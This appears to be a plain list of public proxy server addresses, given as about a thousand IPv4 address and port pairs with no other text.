170.83.78.1:999
77.238.79.111:8080
14.207.85.37:8080
36.91.88.166:8080
181.78.3.137:999
66.90.70.24:3128
183.89.31.81:8081
201.184.176.107:8080
182.253.197.69:8080
119.15.86.30:8080
188.234.216.66:49585
201.71.2.107:999
79.111.13.155:50625
182.253.197.70:8080
36.92.93.61:8080
176.62.188.10:8123
195.123.245.120:80
45.4.252.217:999
195.140.226.244:8080
138.121.161.172:999
103.213.213.22:83
187.102.236.209:999
197.155.230.206:8080
143.137.147.218:999
110.78.28.94:8080
83.220.47.146:8080
176.62.178.247:47556
188.133.152.247:1256
202.52.13.2:8089
194.67.91.153:80
103.85.119.18:9812
175.111.129.156:8080
191.103.219.225:48612
91.197.77.118:443
110.39.9.137:8080
62.183.81.38:8080
194.181.134.81:8080
85.158.75.102:53281
178.115.231.163:8080
203.210.84.171:8181
45.5.58.62:999
103.47.67.154:8080
181.191.140.134:999
136.228.160.250:8080
82.147.118.164:8080
103.147.246.106:8080
102.68.135.21:8080
103.164.112.124:10001
182.16.171.42:43188
180.94.69.66:8080
103.167.109.31:80
45.112.127.78:8080
138.59.187.33:666
42.180.225.145:10161
8.215.31.2:8080
115.96.208.124:8080
77.50.104.110:3128
92.247.2.26:21231
103.79.74.193:53879
36.255.86.233:82
182.253.107.212:8080
181.198.62.154:999
139.255.136.171:8080
103.159.220.65:8080
27.147.209.215:8080
170.239.180.51:999
5.167.141.239:3128
152.228.163.151:80
180.250.153.130:53281
103.161.30.1:83
101.255.117.242:8080
118.163.13.200:8080
74.82.50.155:3128
189.84.114.60:666
102.68.128.219:8080
103.152.232.14:8080
177.93.43.69:999
190.186.18.161:999
200.42.203.96:8080
173.82.149.243:8080
201.140.208.146:3128
177.73.16.74:55443
124.158.167.18:8080
138.117.110.87:999
190.115.12.20:999
95.0.7.17:8080
45.195.76.150:8080
177.136.227.30:3128
186.215.68.51:3127
183.91.0.121:3128
204.199.72.90:999
203.84.153.210:8080
222.173.172.94:8000
187.63.9.38:5566
177.93.38.234:999
202.180.20.66:8080
79.129.147.177:8080
206.161.97.16:31337
200.32.80.56:999
43.245.93.193:53805
182.253.65.17:8085
103.250.153.203:8080
168.227.56.79:8080
43.252.10.146:2222
185.230.4.233:55443
102.141.197.17:8080
77.236.252.187:1256
92.60.238.12:80
163.107.70.18:3128
103.178.43.14:8181
179.189.125.222:8080
89.107.197.165:3128
5.9.210.36:9191
36.91.68.150:8080
95.179.156.86:3128
104.211.157.219:80
186.250.162.165:8080
116.80.41.12:80
124.158.175.19:8080
97.102.248.16:8118
117.4.115.169:8080
62.27.108.174:8080
112.250.107.37:53281
138.201.108.13:3389
189.3.169.34:9812
180.193.213.42:8080
200.229.147.2:999
45.70.236.123:999
170.246.85.9:50991
103.139.25.81:8080
103.156.216.178:3128
181.129.208.27:999
36.95.53.227:8080
103.164.12.66:1080
202.51.176.74:8080
1.4.198.131:8081
202.180.20.10:55443
181.48.35.218:8080
159.192.138.170:8080
103.215.24.190:9812
170.83.78.132:999
14.20.235.19:45770
41.206.36.90:8080
202.182.57.10:8080
62.78.82.94:8282
139.255.26.115:8080
14.241.38.220:19132
197.210.217.66:34808
103.140.35.156:80
103.35.132.18:82
36.91.45.10:51672
201.28.102.234:8080
161.22.34.117:8080
45.184.103.81:999
18.134.249.71:80
117.54.11.85:3128
45.114.118.81:3128
101.51.55.153:8080
186.218.116.113:8080
1.0.205.87:8080
45.225.184.145:999
89.204.214.142:8080
102.68.134.94:8080
58.82.154.3:8080
177.136.32.214:45005
204.199.113.27:999
45.195.76.114:999
190.120.248.89:999
1.1.220.100:8080
177.93.48.117:999
167.172.158.85:81
200.16.208.187:8080
182.176.164.41:8080
139.255.25.85:3128
45.71.115.203:999
103.159.47.9:84
138.121.113.182:999
38.10.246.141:9991
139.255.123.3:8080
103.241.227.98:6666
202.50.53.107:8080
80.26.96.212:80
190.145.200.126:53281
177.55.207.38:8080
200.110.139.202:8080
119.184.185.80:8118
120.29.124.131:8080
103.86.187.242:23500
181.65.189.90:9812
36.92.63.146:8080
144.91.111.4:3128
106.0.48.131:8080
182.136.136.117:7890
38.7.16.81:999
51.91.62.219:80
62.182.114.164:60731
201.77.108.130:999
45.70.15.3:8080
81.91.144.190:55443
200.24.207.196:8080
35.180.247.205:80
185.182.222.178:8080
185.202.165.1:53281
111.225.153.19:8089
112.109.20.238:8080
194.233.69.38:443
190.90.83.225:999
154.73.108.157:1981
37.139.26.54:3128
181.129.98.146:8080
37.29.74.117:8080
43.224.10.30:6666
212.42.116.161:8080
180.211.191.58:8080
170.233.235.249:3128
125.25.40.37:8080
202.91.80.65:8080
118.174.142.242:8080
112.109.20.238:80
186.3.44.182:999
154.73.159.10:8585
190.202.14.132:3128
45.5.94.178:3128
87.103.175.250:9812
191.102.74.113:8080
138.122.147.122:8080
115.124.85.20:8080
118.69.176.168:8080
139.255.77.74:8080
103.181.72.169:80
202.51.114.210:3128
200.61.16.80:8080
103.109.57.250:8889
43.255.113.232:8086
93.157.163.66:35081
103.106.193.117:7532
45.145.20.213:3128
139.99.236.128:3128
43.255.113.232:80
190.217.14.18:999
103.73.74.219:2021
188.133.153.161:1256
45.186.60.10:8085
151.106.18.123:1080
200.39.153.1:999
201.174.10.170:999
139.228.183.102:8080
103.172.70.18:8080
82.165.21.59:80
218.185.234.194:8080
201.182.251.154:8080
162.19.157.77:8001
103.18.77.237:8080
103.156.144.5:83
49.231.200.212:8080
162.219.119.225:8080
113.160.159.160:19132
171.6.17.29:8080
222.165.205.204:8080
104.37.102.209:8181
190.220.1.173:56974
103.159.200.3:8080
138.219.244.154:6666
103.163.236.78:8081
1.0.170.50:80
1.2.252.65:8080
1.255.134.136:3128
1.32.59.217:47045
100.20.101.185:80
101.109.54.166:8080
101.255.117.201:3125
101.255.123.22:888
101.255.127.12:8080
101.255.16.102:8080
101.255.164.58:8080
101.51.139.179:8080
101.51.55.153:8080
101.68.58.135:8085
102.134.127.15:8080
102.164.252.150:8080
102.222.146.203:8080
102.222.51.156:8080
102.38.14.157:8080
102.38.17.121:8080
102.38.21.24:1976
102.38.22.72:8080
102.38.5.161:8080
102.38.6.225:8080
102.39.69.224:8080
102.66.163.162:9999
102.68.128.210:8080
102.68.128.211:8080
102.68.128.212:8080
102.68.130.18:6666
102.68.134.94:8080
102.68.135.129:8080
102.68.135.157:8080
102.68.135.21:8080
102.68.135.229:8080
102.88.13.62:8080
102.89.16.24:8080
103.10.22.236:8080
103.103.52.40:44116
103.104.141.126:8080
103.105.125.6:83
103.105.212.106:53281
103.105.228.66:8080
103.105.78.212:3125
103.105.81.53:8082
103.106.219.135:8080
103.108.9.213:8080
103.109.196.59:3125
103.11.106.12:8181
103.11.106.148:8181
103.11.106.27:8181
103.110.91.242:3128
103.111.214.106:3129
103.115.227.198:8071
103.115.23.66:8080
103.115.252.18:80
103.117.192.14:80
103.117.192.174:80
103.119.55.232:10001
103.121.215.34:43520
103.121.41.165:8080
103.123.234.106:8080
103.123.64.234:3128
103.124.198.102:3125
103.124.198.130:3125
103.124.199.94:3125
103.124.97.11:8080
103.125.154.225:8080
103.125.162.134:83
103.125.50.196:8080
103.127.1.130:80
103.130.106.121:83
103.130.70.201:82
103.130.70.209:83
103.130.70.226:83
103.131.157.174:8080
103.131.18.119:8080
103.131.18.172:8080
103.132.52.214:3128
103.132.54.138:3128
103.132.55.154:8080
103.133.26.107:8181
103.134.177.182:8888
103.134.98.17:83
103.134.98.97:83
103.135.139.65:80
103.135.139.65:8080
103.135.14.176:8181
103.136.207.162:80
103.137.218.166:83
103.137.218.217:83
103.137.218.242:83
103.137.218.81:83
103.137.84.17:83
103.137.91.250:8080
103.138.41.132:8080
103.139.242.169:82
103.140.250.237:3128
103.141.108.122:9812
103.142.110.98:8080
103.142.21.197:8080
103.143.195.94:8080
103.143.25.245:8080
103.143.63.11:3125
103.143.63.3:3125
103.144.146.155:1080
103.144.15.149:8080
103.144.165.86:8080
103.144.18.67:8082
103.144.90.24:8080
103.145.128.179:8088
103.145.149.62:8080
103.145.253.237:3128
103.145.45.57:55443
103.145.57.109:8080
103.146.170.193:83
103.146.196.24:8080
103.146.196.43:3125
103.147.77.66:5021
103.148.154.59:8080
103.148.192.74:80
103.148.195.22:8080
103.148.201.76:8080
103.148.25.208:8080
103.148.39.50:83
103.15.60.229:8080
103.15.60.23:8080
103.151.177.221:8080
103.151.247.65:8080
103.152.100.187:8080
103.152.112.162:80
103.152.232.100:8080
103.152.232.14:8080
103.152.232.162:8080
103.152.232.194:8080
103.152.232.234:8080
103.152.232.68:8080
103.152.232.69:8080
103.153.136.187:8080
103.154.120.107:8080
103.154.230.138:8080
103.154.230.81:5678
103.154.230.99:5678
103.154.231.68:3125
103.154.65.122:8080
103.154.85.162:8080
103.154.91.182:8080
103.155.166.38:8181
103.155.166.81:8181
103.155.196.133:3125
103.155.196.135:3125
103.155.54.14:83
103.155.54.14:84
103.155.54.185:83
103.155.54.233:83
103.155.54.245:83
103.156.14.194:3125
103.156.141.239:3125
103.156.17.123:8888
103.156.17.35:8181
103.156.216.178:443
103.156.222.1:8181
103.156.232.81:3125
103.156.233.128:3125
103.156.233.132:3125
103.156.233.161:3125
103.156.249.88:8080
103.159.168.80:3128
103.159.200.3:8080
103.159.220.141:443
103.159.46.10:83
103.159.46.121:83
103.159.46.125:82
103.159.46.25:83
103.159.47.5:83
103.159.47.9:83
103.159.68.147:8080
103.159.96.6:3125
103.16.128.221:80
103.160.15.2:3125
103.160.15.38:3125
103.160.201.92:8080
103.161.130.113:8085
103.162.205.251:8181
103.163.193.97:83
103.164.180.90:8080
103.164.200.227:81
103.164.221.34:8080
103.164.56.122:8080
103.165.156.179:3125
103.165.157.15:8080
103.165.251.129:3125
103.165.251.2:8080
103.165.253.130:3125
103.165.253.30:3128
103.165.253.30:8080
103.166.10.57:3125
103.166.210.123:443
103.166.28.12:8181
103.166.39.17:8080
103.167.109.31:80
103.167.134.31:80
103.167.170.253:3125
103.167.170.26:8181
103.168.164.26:82
103.168.29.228:9812
103.168.44.137:3127
103.169.149.8:8080
103.169.186.128:3125
103.169.186.162:3125
103.169.186.164:3125
103.169.186.71:3125
103.169.186.75:3125
103.169.186.9:3125
103.169.187.162:3125
103.169.187.165:3125
103.169.187.166:3125
103.169.187.171:3125
103.169.187.176:3125
103.169.187.180:3125
103.169.187.37:3125
103.169.198.123:8080
103.169.254.22:8080
103.17.201.130:8080
103.17.213.98:8080
103.170.22.50:8089
103.170.97.60:8080
103.171.182.229:8080
103.171.5.33:8080
103.172.70.27:81
103.173.231.64:8085
103.173.233.242:8080
103.174.45.58:8080
103.175.156.10:8080
103.175.156.142:8080
103.175.236.189:8080
103.175.237.9:3127
103.175.46.105:3125
103.175.46.21:3125
103.175.46.39:3125
103.175.46.46:8181
103.177.20.148:8181
103.178.223.22:3125
103.179.109.156:3128
103.18.77.18:8080
103.180.250.246:9091
103.181.245.147:8080
103.181.245.149:8080
103.182.52.246:3125
103.183.60.226:9812
103.189.222.5:8080
103.19.130.50:8080
103.19.58.122:8080
103.193.119.126:8080
103.197.251.202:80
103.199.155.18:8080
103.20.204.104:80
103.205.183.11:55443
103.205.183.18:55443
103.206.51.225:84
103.207.1.82:8080
103.207.7.1:84
103.208.102.41:8080
103.212.239.42:3125
103.214.201.209:80
103.214.201.209:8080
103.215.207.34:82
103.215.207.34:83
103.215.207.38:82
103.215.207.54:81
103.215.207.54:83
103.215.207.74:82
103.215.207.81:83
103.215.207.85:83
103.218.102.162:8080
103.220.204.101:59570
103.221.54.113:8080
103.227.252.102:8080
103.228.245.70:3125
103.228.246.69:8080
103.231.78.36:80
103.233.156.44:8080
103.235.67.13:8080
103.236.193.241:83
103.241.178.10:3125
103.241.182.97:80
103.242.105.220:8080
103.243.114.206:8080
103.243.177.129:8080
103.243.177.90:8080
103.245.198.54:8080
103.247.121.114:8080
103.247.121.115:8080
103.247.22.52:8080
103.248.120.5:8080
103.248.93.5:8080
103.250.68.10:8080
103.252.1.137:3128
103.253.112.113:3128
103.27.118.138:8080
103.28.225.146:8080
103.29.185.54:8181
103.29.90.230:8080
103.30.246.41:8888
103.31.251.124:8080
103.35.132.18:83
103.35.132.18:84
103.36.10.212:8080
103.36.35.135:8080
103.36.8.244:8080
103.38.5.226:83
103.4.164.204:8080
103.41.212.229:44759
103.44.156.65:8080
103.45.105.158:3128
103.47.13.33:8080
103.47.13.41:8080
103.47.175.161:83
103.47.66.154:8080
103.48.68.34:82
103.48.68.34:83
103.48.68.34:84
103.48.68.35:83
103.48.68.35:84
103.48.68.36:82
103.48.68.36:83
103.48.68.36:84
103.48.68.37:84
103.49.202.252:80
103.51.21.250:81
103.51.21.250:82
103.51.21.250:83
103.51.45.249:3125
103.55.33.59:8080
103.55.48.206:8080
103.59.176.154:8080
103.60.173.5:8080
103.60.26.178:3128
103.65.212.150:8085
103.65.212.36:8082
103.69.216.17:8080
103.7.27.186:8080
103.70.130.134:83
103.70.79.2:8080
103.71.22.2:83
103.71.64.130:3129
103.75.27.58:8087
103.76.12.42:80
103.76.12.42:8181
103.76.253.66:3129
103.76.27.34:8080
103.77.107.184:3128
103.77.185.122:80
103.77.41.138:8080
103.77.76.186:8080
103.78.74.44:8080
103.78.75.91:8080
103.79.74.193:53879
103.79.74.65:53879
103.80.237.211:3888
103.81.114.182:53281
103.81.214.235:83
103.83.232.122:80
103.84.131.110:83
103.85.114.240:8080
103.85.114.24:8080
103.88.143.34:8081
103.89.4.163:3128
103.9.156.113:3128
103.9.156.99:3128
103.94.170.202:3888
104.155.179.128:3128
104.167.6.218:80
104.193.37.134:8080
104.248.137.5:80
104.248.90.212:80
104.37.102.130:8181
104.37.102.181:8181
104.37.99.129:8282
105.112.135.166:8080
105.112.142.210:8080
105.112.191.250:3128
105.19.63.217:9812
105.28.176.41:9812
106.113.188.226:8089
106.113.189.128:8089
106.14.139.3:7777
106.15.2.195:8118
106.60.70.243:80
106.75.171.235:8080
107.178.7.73:8080
107.6.109.62:3128
108.170.12.13:80
109.107.155.131:8090
109.107.155.147:8090
109.172.176.170:8080
109.195.23.223:34031
109.200.155.195:8080
109.200.159.28:8080
109.200.159.29:8080
109.201.9.100:8080
109.86.182.203:3128
109.92.222.170:53281
109.94.2.224:8080
110.137.25.226:443
110.164.162.46:8080
110.164.3.7:8888
110.171.84.180:8080
110.172.151.146:8080
110.172.155.46:8080
110.232.67.43:55443
110.232.67.44:55443
110.238.109.146:8080
110.238.111.229:8080
110.238.113.119:8080
110.238.74.184:8080
110.34.3.229:3128
110.74.195.65:55443
110.74.219.3:8080
110.77.134.106:8080
110.77.236.253:8080
110.78.112.198:8080
110.78.114.161:8080
110.78.147.133:8080
110.78.28.94:8080
110.78.81.107:8080
111.118.135.132:56627
111.160.204.146:9091
111.199.66.67:8118
111.224.146.128:8089
111.224.146.14:8089
111.225.152.133:8089
111.225.152.155:8089
111.225.152.204:8089
111.225.152.38:8089
111.225.153.106:8089
111.225.153.124:8089
111.225.153.149:8089
111.225.153.197:8089
111.225.153.80:8089
111.59.194.52:9091
111.67.71.139:3888
111.68.31.154:8080
111.85.159.65:9091
111.90.149.62:3128
112.109.23.18:6565
112.11.242.201:9091
112.120.41.171:80
112.133.219.234:3127
112.137.142.8:3128
112.14.40.137:9091
112.14.47.6:52024
112.2.34.99:9091
112.246.232.49:8060
112.250.105.62:9091
112.250.110.172:9091
112.26.81.142:9091
112.35.127.238:3128
112.36.17.39:9091
112.44.126.88:9091
112.49.34.128:9091
112.5.56.2:9091
112.51.96.118:9091
112.54.41.177:9091
112.54.47.55:9091
112.6.117.178:8085
112.78.131.91:8080
112.86.154.242:3128
113.160.159.160:19132
113.160.182.236:19132
113.160.208.255:8080
113.160.214.209:19132
113.160.235.248:19132
113.160.37.152:53281
113.161.210.140:8080
113.161.59.136:8080
113.181.39.203:19132
113.195.121.135:8085
113.195.121.165:8085
113.201.49.148:8118
113.203.241.94:8080
113.21.236.147:443
113.21.236.147:9401
113.21.236.147:9443
113.21.236.147:9480
113.214.4.8:84
113.23.176.254:8118
113.50.66.19:9091
113.53.53.16:8080
113.53.60.207:8080
113.57.84.39:9091
114.116.123.178:3128
114.116.2.116:8001
114.130.78.185:8080
114.231.41.118:8089
114.231.41.238:8089
114.231.42.202:8089
114.231.45.117:8888
114.232.110.251:8089
114.232.110.33:8089
114.255.132.60:3128
114.5.181.10:8080
114.7.193.212:8080
114.88.240.115:55443
115.124.75.33:8080
115.124.79.92:8080
115.147.59.55:8181
115.248.66.131:3129
115.42.2.251:53281
115.74.246.138:8080
115.75.1.184:8118
115.96.208.124:8080
116.0.4.54:8080
116.107.251.224:3333
116.197.130.26:8089
116.197.130.71:80
116.197.154.81:8080
116.227.169.192:8085
116.239.24.90:808
116.254.119.31:8080
116.63.128.247:7777
116.63.128.247:8080
116.63.128.247:8118
116.63.128.247:8888
116.63.128.247:9000
116.63.128.247:9091
116.63.128.247:9999
116.71.139.73:8080
117.102.70.42:8080
117.102.75.13:9999
117.102.81.3:53281
117.102.81.6:53281
117.102.87.66:8080
117.121.202.62:8888
117.121.204.9:7998
117.149.0.14:9091
117.157.197.18:3128
117.158.146.215:9091
117.160.250.130:80
117.160.250.130:8080
117.160.250.130:8081
117.160.250.130:81
117.160.250.130:9999
117.160.250.131:80
117.160.250.131:8080
117.160.250.131:8081
117.160.250.131:81
117.160.250.131:9999
117.160.250.132:80
117.160.250.132:8080
117.160.250.132:8081
117.160.250.132:81
117.160.250.132:9999
117.160.250.133:80
117.160.250.133:8080
117.160.250.133:8081
117.160.250.133:81
117.160.250.133:9999
117.160.250.134:80
117.160.250.134:8080
117.160.250.134:8081
117.160.250.134:81
117.160.250.134:9999
117.160.250.137:80
117.160.250.137:8080
117.160.250.137:8081
117.160.250.137:81
117.160.250.137:9999
117.160.250.138:80
117.160.250.138:8080
117.160.250.138:8081
117.160.250.138:81
117.160.250.138:9999
117.160.250.163:80
117.160.250.163:8080
117.160.250.163:8081
117.160.250.163:81
117.160.250.163:9999
117.186.143.130:8118
117.198.97.220:80
117.21.200.19:3128
117.4.115.169:8080
117.41.38.18:9000
117.54.11.85:3128
117.54.114.35:80
117.54.114.96:80
117.54.114.97:80
117.54.114.98:80
117.57.119.26:8089
117.69.231.214:8089
117.74.65.207:3128
117.74.65.207:50001
117.74.65.207:6666
117.74.65.207:7777
117.74.65.207:8001
117.74.65.207:8080
117.74.65.207:88
117.74.65.207:9000
117.74.65.207:9091
118.107.44.181:80
118.107.44.181:8000
118.137.70.48:8080
118.140.152.250:80
118.163.13.200:8080
118.172.187.127:8080
118.172.43.60:8080
118.173.242.189:8080
118.179.52.55:8080
118.212.152.82:9091
118.67.219.153:8080
118.67.221.82:8080
118.70.109.148:55443
118.97.164.19:8080
118.97.235.234:8080
118.97.47.248:55443
118.99.103.162:8080
118.99.113.205:8080
118.99.73.221:8080
119.12.168.222:443
119.18.158.137:8080
119.196.112.2:8443
119.2.41.201:8080
119.235.17.105:55443
119.245.209.189:80
119.252.167.130:41890
119.252.168.218:7676
119.252.171.50:8080
119.28.223.220:5566
119.7.135.19:9091
119.82.241.21:8080
12.69.91.227:80
120.194.55.139:6969
120.195.150.91:9091
120.196.186.248:9091
120.196.188.21:9091
120.197.219.82:9091
120.220.220.95:8085
120.234.202.9:9091
120.236.190.122:9091
120.236.41.185:9091
120.237.144.200:9091
120.237.144.57:9091
120.37.177.50:9091
120.46.197.14:8080
120.46.215.52:8080
120.50.19.84:8080
120.82.174.128:9091
120.89.90.250:3125
121.1.41.162:111
121.101.131.142:9090
121.101.133.61:8080
121.101.134.22:8080
121.13.252.61:41564
121.22.53.166:9091
121.31.160.5:8085
121.37.179.86:8889
121.37.201.60:8080
121.37.203.216:8080
121.37.207.154:8080
121.40.217.65:1080
121.8.215.106:9797
122.102.118.82:8080
122.102.118.83:8080
122.136.212.132:53281
122.166.193.145:3127
122.166.206.148:3127
122.185.183.194:8080
122.2.28.114:8080
122.226.170.213:80
122.3.103.31:3128
122.3.41.154:8090
122.53.117.54:3128
122.9.131.161:3128
122.9.131.161:31328
122.9.131.161:6666
122.9.131.161:8000
122.9.131.161:8080
122.9.131.161:9000
122.9.131.161:9091
122.9.131.161:9999
122.9.151.210:10000
122.9.151.210:111
122.9.151.210:20000
122.9.151.210:3128
122.9.151.210:3132
122.9.151.210:31328
122.9.151.210:5566
122.9.151.210:6379
122.9.151.210:6666
122.9.151.210:7890
122.9.151.210:8080
122.9.151.210:8081
122.9.151.210:8085
122.9.151.210:8118
122.9.151.210:8888
122.9.151.210:9000
122.9.151.210:9091
122.9.151.210:9999
123.117.52.147:888
123.117.52.147:8888
123.130.115.217:9091
123.157.233.138:9091
123.16.32.162:8080
123.171.1.100:8089
123.171.42.74:8089
123.180.189.135:9091
123.182.58.243:8089
123.182.58.25:8089
123.182.58.65:8089
123.182.58.93:8089
123.182.59.175:8089
123.182.59.192:8089
123.182.59.203:8089
123.182.59.222:8089
123.182.59.226:8089
123.182.59.249:8089
123.182.59.29:8089
123.182.59.64:8089
123.182.59.70:8089
123.182.59.75:8089
123.182.59.76:8089
123.182.59.97:8089
123.200.26.214:8080
123.60.109.71:8080
123.60.139.197:8080
124.106.226.240:3128
124.158.166.246:9999
124.158.167.173:8080
124.158.9.185:3128
124.16.136.101:4780
124.193.132.42:9091
124.41.240.96:55443
124.70.221.252:8080
124.71.186.187:3128
125.25.40.37:8080
125.66.100.112:9091
125.66.232.113:9091
128.199.202.122:3128
128.199.202.122:8080
128.199.234.76:8080
128.201.119.251:999
128.30.16.217:3128
128.69.178.165:8080
129.154.192.70:3128
129.205.106.42:8080
13.90.150.239:80
13.90.211.8:80
13.92.136.193:3128
130.185.119.20:3128
130.41.55.190:8080
131.106.216.130:8080
131.108.220.57:45005
131.161.239.126:8090
131.161.53.38:1994
131.221.66.138:3128
131.72.68.161:40033
131.72.68.253:40033
132.145.223.145:3128
132.255.210.114:999
132.255.210.117:999
133.125.54.107:80
133.130.108.201:8080
134.0.63.134:8000
134.119.46.153:80
134.122.19.91:8081
134.19.254.2:21231
135.181.10.138:8080
135.181.50.119:443
136.228.160.250:8080
136.234.54.156:80
137.184.100.135:80
137.74.90.233:8282
138.0.231.202:999
138.117.110.87:999
138.117.231.129:999
138.117.231.130:999
138.117.78.91:999
138.117.84.65:999
138.121.113.164:999
138.121.161.82:8094
138.121.161.82:8095
138.121.161.84:8096
138.121.161.84:8097
138.121.161.86:8097
138.122.82.145:8080
138.201.163.123:80
138.219.244.128:6666
138.36.23.229:8080
138.68.235.51:80
139.162.153.173:80
139.162.44.152:57114
139.228.183.102:8080
139.255.10.234:8080
139.255.123.3:8080
139.255.21.74:8080
139.255.74.124:8080
139.255.94.123:39635
139.59.1.14:3128
139.59.1.14:8080
139.59.195.27:80
139.59.233.24:3128
139.99.237.62:80
14.102.37.1:8080
14.139.242.7:80
14.140.131.82:3128
14.160.32.23:8080
14.162.146.186:19132
14.17.94.9:443
14.170.137.82:9812
14.170.154.10:8080
14.177.236.212:55443
14.192.1.198:83
14.192.145.195:8080
14.205.208.224:8085
14.207.148.147:8080
14.224.131.136:8080
14.241.225.134:443
14.248.80.77:8080
14.29.139.251:8123
140.227.211.47:8080
140.227.25.191:23456
140.227.59.167:3180
140.227.61.156:23456
140.227.69.124:3180
140.227.80.237:3180
140.83.32.175:80
141.136.63.66:999
142.147.114.50:8080
142.44.148.56:8080
142.93.108.171:3128
142.93.31.20:3128
143.0.234.206:9090
143.198.182.218:80
143.202.78.177:999
143.208.152.157:3180
143.208.156.170:8080
143.244.133.78:80
143.244.175.220:999
143.255.142.80:8080
144.123.46.90:9091
144.217.119.85:3207
144.76.60.58:8118
144.91.85.172:3128
145.40.121.101:3128
145.40.121.103:3128
145.40.121.149:3128
145.40.121.155:3128
145.40.121.157:3128
145.40.121.21:3128
145.40.121.73:3128
145.40.77.207:3128
146.196.48.2:80
146.56.119.252:80
147.135.134.57:5566
147.135.134.57:9300
147.139.133.146:8080
147.139.164.26:8080
147.28.155.79:3128
148.101.179.182:8080
148.204.171.217:80
149.129.179.23:8080
149.129.184.250:8080
149.129.187.190:3128
149.129.187.190:8080
149.129.187.190:8899
149.129.191.110:8080
149.129.213.200:8080
149.129.232.50:8080
149.34.3.152:8080
149.54.6.51:8080
149.56.96.252:5566
149.57.11.17:8181
15.236.134.130:80
150.107.137.25:8080
151.22.181.214:8080
151.237.84.8:8080
152.169.106.145:80
152.169.187.209:3128
152.200.138.122:999
152.200.154.52:999
152.231.98.50:999
152.249.253.176:8080
153.122.1.160:80
153.126.179.216:8080
154.113.19.30:8080
154.113.32.26:8080
154.113.32.9:8080
154.117.138.50:8080
154.117.159.230:8080
154.236.168.169:1976
154.236.177.100:1976
154.236.179.226:1976
154.236.179.233:1976
154.236.179.233:1981
154.236.184.71:1976
154.236.184.86:1975
154.236.189.24:1976
154.53.59.246:3128
154.64.117.175:80
154.64.117.176:80
154.64.117.179:80
154.64.117.186:80
154.64.117.187:80
154.64.117.190:80
154.64.117.191:80
154.64.117.193:80
154.64.117.195:80
154.64.117.196:80
154.64.117.197:80
154.64.117.198:80
154.64.117.200:80
154.64.117.202:80
154.64.117.203:80
154.64.117.207:80
154.64.117.209:80
154.64.117.210:80
154.64.117.211:80
154.64.117.215:80
154.64.117.216:80
154.64.117.219:80
154.64.117.220:80
154.64.117.223:80
154.64.117.224:80
154.64.117.225:80
154.64.117.227:80
154.64.117.228:80
154.64.117.229:80
154.64.117.230:80
154.64.117.232:80
154.64.117.233:80
154.64.117.234:80
154.64.117.236:80
154.64.117.238:80
154.64.117.239:80
154.64.117.245:80
154.64.117.246:80
154.64.117.247:80
154.64.117.248:80
154.64.117.249:80
154.64.117.254:80
154.64.118.15:80
154.64.118.16:80
154.64.118.18:80
154.64.118.19:80
154.64.118.20:80
154.64.118.21:80
154.64.118.24:80
154.64.118.25:80
154.64.118.26:80
154.64.118.29:80
154.64.118.30:80
154.64.118.32:80
154.64.118.34:80
154.64.118.35:80
154.64.118.39:80
154.64.118.44:80
154.64.118.49:80
154.64.118.52:80
154.64.118.54:80
154.64.118.56:80
154.64.118.59:80
154.64.118.61:80
154.64.118.69:80
154.64.118.6:80
154.64.118.72:80
154.64.118.73:80
154.64.118.7:80
154.64.211.145:999
154.64.219.41:8888
154.7.6.94:80
154.85.58.149:80
155.223.64.80:8081
155.4.244.218:80
155.93.96.210:8080
156.200.116.72:1976
156.200.116.73:1976
156.200.116.73:1981
156.67.217.159:80
157.100.12.138:999
157.100.53.107:999
157.100.53.109:999
157.100.53.110:999
157.100.53.99:999
157.100.56.180:999
157.100.58.187:999
157.119.211.133:8080
157.230.241.133:42281
157.230.34.152:36097
157.230.34.152:40141
157.230.34.219:3128
157.230.40.79:8080
158.140.178.78:8080
158.51.107.253:8080
158.58.173.147:80
158.69.185.37:3129
158.69.53.98:9300
158.69.71.245:9300
159.138.151.154:3128
159.138.169.166:8080
159.138.169.48:8080
159.138.252.45:8080
159.138.255.141:8080
159.192.138.170:8080
159.224.243.185:37793
159.65.69.186:9300
159.89.132.167:8989
159.89.134.3:3128
160.16.105.145:8080
160.226.132.33:8080
160.251.97.210:3128
161.35.214.127:43231
161.35.223.141:80
161.49.176.173:1337
161.97.126.151:3128
161.97.126.151:3129
161.97.126.37:8118
161.97.137.115:3127
162.19.71.175:80
162.217.248.10:3128
162.217.248.153:3128
162.243.166.193:3128
162.250.112.129:8282
163.172.215.211:3128
164.132.170.100:80
164.68.124.245:80
164.92.237.164:8888
164.92.75.10:80
165.140.242.57:3128
165.154.225.65:80
165.154.226.12:80
165.154.227.188:80
165.154.243.252:80
165.154.243.53:80
165.16.0.105:1981
165.16.22.138:9999
165.16.27.30:1981
165.16.27.34:1981
165.16.27.36:1981
165.16.30.161:8080
165.16.45.92:7777
165.16.46.67:8080
165.16.60.192:8080
165.165.182.10:8081
165.22.218.125:3128
165.73.128.125:56975
165.73.128.173:56975
165.73.128.209:56975
165.73.129.45:56975
165.90.225.15:3389
167.114.19.195:8050
167.172.74.255:8080
167.179.45.50:55443
167.235.253.64:80
167.250.180.6:6969
167.99.163.146:3128
168.138.211.5:8080
168.181.131.119:8080
168.181.196.76:8080
168.196.124.130:999
168.90.121.19:8080
169.38.88.210:3128
169.46.126.192:80
169.57.1.85:8123
170.0.86.144:999
170.150.32.206:8080
170.210.121.190:8080
170.231.55.142:999
170.238.14.107:8080
170.238.160.192:666
170.254.201.116:3180
170.254.201.38:3180
170.79.12.66:9090
170.80.202.246:999
170.81.78.151:8080
170.81.86.125:3128
170.83.242.250:999
171.34.53.2:9091
171.35.164.168:8085
171.35.164.241:8085
171.91.144.112:8118
172.104.111.212:80
172.104.206.170:80
172.104.252.86:3128
172.104.252.86:8045
172.105.172.220:14186
172.105.172.220:8080
172.105.184.208:50877
172.105.184.208:8001
173.196.205.170:8080
173.197.167.242:8080
173.212.200.30:3128
173.212.209.233:3128
173.212.213.133:3128
173.212.247.75:80
173.219.112.85:8080
173.230.153.163:8080
173.249.54.192:3128
173.255.209.155:1080
174.81.78.64:48678
175.100.103.170:55443
175.106.10.164:8089
175.111.129.156:8080
175.139.179.65:42580
175.6.185.156:9128
176.101.179.17:8080
176.110.121.90:21776
176.118.50.239:53281
176.119.158.31:8118
176.192.70.58:8022
176.192.70.58:8027
176.192.80.10:3128
176.194.189.40:80
176.202.178.188:8080
176.213.141.107:8080
176.235.131.229:9090
176.236.191.17:3111
176.236.232.54:9090
176.241.142.3:8081
176.56.107.239:61071
176.88.51.20:3333
176.9.46.136:3000
176.99.2.43:1081
177.101.0.199:8080
177.105.232.114:8080
177.12.238.100:3128
177.12.238.1:3128
177.125.169.6:55443
177.184.137.26:80
177.220.131.186:3128
177.222.104.235:999
